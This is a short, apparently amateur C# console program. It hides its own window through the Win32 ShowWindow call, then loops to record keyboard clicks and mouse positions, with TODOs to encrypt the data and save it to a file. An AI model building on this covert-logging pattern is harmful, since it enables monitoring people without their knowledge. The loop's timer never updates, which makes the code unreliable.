using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Timers;
using System.Threading;

namespace ConsoleApp1
{
	class Program		   
	{
		
		static Stopwatch stpWatch;
		//https://www.dotnetperls.com/stopwatch
		static SaveState st;
		const long MaxTime = 1800000;
		//static IntPtr hWnd;

		static IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle; //need the handle for THIS program to find out what I need to "hide".
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		static void Main(string[] args)
		{
		   
			
			ShowWindow(hWnd, 0); //0 hides cmd line, 1 shows.
			
			stpWatch = new Stopwatch();
			stpWatch.Start();
			long timespan = stpWatch.ElapsedMilliseconds;
			while(timespan < MaxTime) //30 minutes	//could just make a boolian
			{

				st = EventCollection.Run(stpWatch);
				
				Console.WriteLine(st.time + " | " + st.keyBoardClick + " | " + st.mousePosistion.X + " | " + st.mousePosistion.Y);


				Thread.Sleep(100);				
				//TODO: Ecrypt data file
				//TODO: Write to file


				if (timespan == MaxTime-1)//might need to give leway
				{
					stpWatch.Reset();
				}

			}

			//Console.ReadKey();
		}
	}
}
